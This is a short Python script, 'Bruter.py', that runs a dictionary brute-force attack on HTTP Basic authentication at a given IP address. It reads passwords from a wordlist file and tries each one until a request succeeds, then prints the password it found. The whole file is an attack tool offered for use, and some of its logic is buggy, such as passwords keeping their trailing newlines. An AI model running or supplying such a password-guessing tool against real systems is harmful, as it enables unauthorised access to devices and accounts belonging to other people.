#!/usr/bin/env python
#title           :Bruter.py
#description     :Brute force password manager/attacker
#author          :j311yf1sh
#date            :8/28/2013
#version         :0.0
#notes           :Uknown
#python_version  :3.3.2
#Requires        :None
#==============================================================================

import urllib.request
import os
import time

class DictBruter:
    def __init__(self,IP,PassList,User):
        self.AttemptNum = 0
        self.User = User
        self.PassList = self.PassWordLoader(PassList) #Pass the file name into loader
        self.IP = IP

        if self.PassList == None: #Check if it worked first time around
            self.PassList = self.PassWordLoader(PassList)

        self.BruteLoop() #Start main brute loop
        
    def BruteLoop(self):
        while self.AttemptNum < len(self.PassList):
            
            Password = self.PassList[self.AttemptNum]#Load password num from password list
            self.PassAuthenticator(self.User,Password) # Pass the password to http manager

            try:
                uf = urllib.request.urlopen('http://'+self.IP) #load page
                print('         The Password is: '+Password+'\n') #if previous worked, passed
                self.AttemptNum = len(self.PassList)
                input('         Press Enter to continue...')
                break
            except urllib.error.HTTPError: #accept wrong password
                print("         Default password is not "+ Password) #Display last word
                self.AttemptNum = self.AttemptNum + 1 #increase attempts
                continue #continue with loop
            except urllib.error.URLError: #Wrong ip
                print("         No such ip found")
                input('         Press Enter to continue...')
                break # break loop
            
    def PassWordLoader(self,DictName): #load passwords from a file or create if not found
        DictName = DictName
        ScriptDir = os.path.dirname(__file__) #get current dir of file
        RelDir = "Dicts/"+DictName #Dir we need
        ABS_PATH = os.path.join(ScriptDir,RelDir) #Join both dirs
        try: #try to open file and append the words inside to a list
            FILE = open(ABS_PATH,'r')
            WordList = []

            for WORD in FILE:
                WordList.append(WORD)

            FILE.close()
            return WordList
        except: #if try failed, Create a file with the word blank.
            FILE = open(ABS_PATH,'w')
            FILE.write("blank")
            print("File not found: Creating")
            time.sleep(3)  #safety in creating file
            FILE.close()


    def PassAuthenticator(self,User,Pass):  # I have no idea what i did here.
        PassManager = urllib.request.HTTPPasswordMgrWithDefaultRealm()
        PassManager.add_password(None,self.IP,User,Pass)
        AuthHandler = urllib.request.HTTPBasicAuthHandler(PassManager)
        Opener = urllib.request.build_opener(AuthHandler)
        urllib.request.install_opener(Opener)
